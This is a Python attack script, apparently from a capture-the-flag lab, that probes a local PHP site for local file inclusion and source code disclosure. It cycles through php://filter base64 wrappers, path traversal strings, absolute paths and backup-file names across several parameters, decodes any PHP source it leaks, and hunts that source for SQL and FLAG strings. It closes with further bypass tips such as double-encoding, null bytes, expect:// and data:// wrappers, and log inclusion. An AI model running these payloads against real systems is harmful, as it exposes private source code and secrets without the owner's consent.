import requests
import base64
import re
import urllib.parse

# Target URLs (as provided)
base_urls = [
    "http://127.0.0.1:32826/send.php",
    "http://127.0.0.1:32826/index.php",
    "http://127.0.0.1:32826/"
]

# Comprehensive payload combinations
lfi_tests = [
    # Basic direct includes (these are unlikely to show source, but test anyway)
    ("file", "send.php"),
    ("page", "send.php"),
    
    # php://filter wrapper - PRIMARY technique for source disclosure
    ("file", "php://filter/convert.base64-encode/resource=send.php"),
    ("page", "php://filter/convert.base64-encode/resource=send.php"),
    ("inc", "php://filter/convert.base64-encode/resource=send.php"),
    ("include", "php://filter/convert.base64-encode/resource=send.php"),
    ("view", "php://filter/convert.base64-encode/resource=send.php"),
    ("load", "php://filter/convert.base64-encode/resource=send.php"),
    
    # Path traversal variants
    ("file", "../../../send.php"),
    ("file", "....//....//....//send.php"),
    ("file", "../send.php"),
    ("page", "../../../send.php"),
    ("inc", "../../../send.php"),
    ("include", "../../../send.php"),
    
    # Absolute paths
    ("file", "/var/www/html/send.php"),
    ("file", "/var/www/send.php"),
    ("page", "/var/www/html/send.php"),
    
    # Backup files
    ("file", "send.php.bak"),
    ("file", "send.php.old"),
    ("file", "send.php~"),
    ("file", "send.phps"),
    ("file", ".send.php.swp"),
    ("page", "send.php.bak"),
    
    # Variations for include
    ("inc", "../send.php"),
    ("inc", "send.php.bak"),
    
    # Variations for include parameter
    ("include", "../send.php"),
    ("include", "send.php.bak"),
]

total_tests = 0
successful_tests = []

print("="*70)
print("LFI & Source Code Disclosure Testing for send.php")
print("="*70)

for base_url in base_urls:
    print(f"\n[TESTING] Base URL: {base_url}")
    print("-"*70)
    
    for param, payload in lfi_tests:
        total_tests += 1
        
        # Construct request URL
        separator = "&" if "?" in base_url else "?"
        url = f"{base_url}{separator}{param}={payload}"
        
        try:
            print(f"\n[TEST {total_tests}] {url}")
            response = requests.get(url, timeout=5)
            print(f"Status: {response.status_code} | Size: {len(response.content)}B")
            
            # Check if we got PHP source or base64 encoded content
            if response.status_code == 200 and len(response.content) > 0:
                content = response.text
                decoded_source = None
                
                # Method 1: Look for base64 encoded content (from php://filter)
                if "convert.base64-encode" in payload:
                    # Try to extract base64 from response
                    # Often wrapped in JSON, HTML tags, or plain text
                    b64_pattern = r'([A-Za-z0-9+/]{30,}[=]{0,2})'
                    b64_matches = re.findall(b64_pattern, content, re.MULTILINE)
                    
                    for match in b64_matches:
                        try:
                            # Attempt to decode
                            decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                            if "<?php" in decoded or "<?=" in decoded:
                                decoded_source = decoded
                                print(f"\n[!] SUCCESS! Base64 decoded PHP source found!")
                                break
                        except:
                            continue
                
                # Method 2: Direct source disclosure (less common)
                if not decoded_source and ("<?php" in content or "<?=" in content):
                    if len(content.strip()) > 50:  # Avoid short fragments
                        decoded_source = content
                        print(f"\n[!] SUCCESS! Direct PHP source disclosure!")
                
                # Method 3: Try decoding entire response as base64
                if not decoded_source and "convert.base64-encode" in payload:
                    try:
                        # Strip whitespace and common wrappers
                        clean_content = content.strip().strip('"').strip("'").strip()
                        decoded = base64.b64decode(clean_content).decode('utf-8', errors='ignore')
                        if "<?php" in decoded or "<?=" in decoded:
                            decoded_source = decoded
                            print("\n[!] SUCCESS! Full response base64 decoded!")
                    except:
                        pass
                
                # If we found source code, display it
                if decoded_source:
                    successful_tests.append((url, decoded_source[:500]))
                    
                    print("\n" + "="*70)
                    print("EXTRACTED PHP SOURCE CODE:")
                    print("="*70)
                    print(decoded_source)
                    print("="*70)
                    
                    # Look for SQL queries
                    sql_keywords = ["SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE", "JOIN", "ORDER BY", "GROUP BY"]
                    sql_found = []
                    for keyword in sql_keywords:
                        if keyword.lower() in decoded_source.lower():
                            sql_found.append(keyword)
                    
                    if sql_found:
                        print(f"\n[SQL DETECTED] {' | '.join(sql_found)}")
                    
                    # Check for FLAG patterns
                    flag_pattern = r'FLAG\{[^}]+\}'
                    flags = re.findall(flag_pattern, decoded_source)
                    if flags:
                        print(f"\n[!] FLAG(S) FOUND: {flags}")
                    
                    print("\n" + "!"*70)
                    print("SOURCE DISCLOSURE SUCCESSFUL - STOPPING FURTHER TESTS")
                    print("!"*70)
                    
                    # Exit with source code found
                    print(f"\n[EXIT] Source retrieved after {total_tests} tests")
                    import sys
                    sys.exit(0)
            
        except Exception as e:
            print(f"[ERROR] {e}")
            continue

print("\n" + "="*70)
print("TESTING COMPLETE - Summary")
print("="*70)
print(f"Total tests performed: {total_tests}")
print(f"Successful disclosures: {len(successful_tests)}")

if successful_tests:
    print("\n[+] Partial matches found (non-PHP content):")
    for url, content in successful_tests:
        print(f"- {url}")
        if len(content.strip()) > 0:
            print(f"  Preview: {content[:100]}...")
else:
    print("\n[-] No PHP source code disclosed")
    print("\n[RECOMMENDATIONS]")
    print("1. Try double-encoding: %252e%252e%252f")
    print("2. Try null byte if PHP < 5.3.4: %00")
    print("3. Try different wrappers: expect://, data://")
    print("4. Test on different base files discovered earlier")
    print("5. Check for log file inclusion paths")
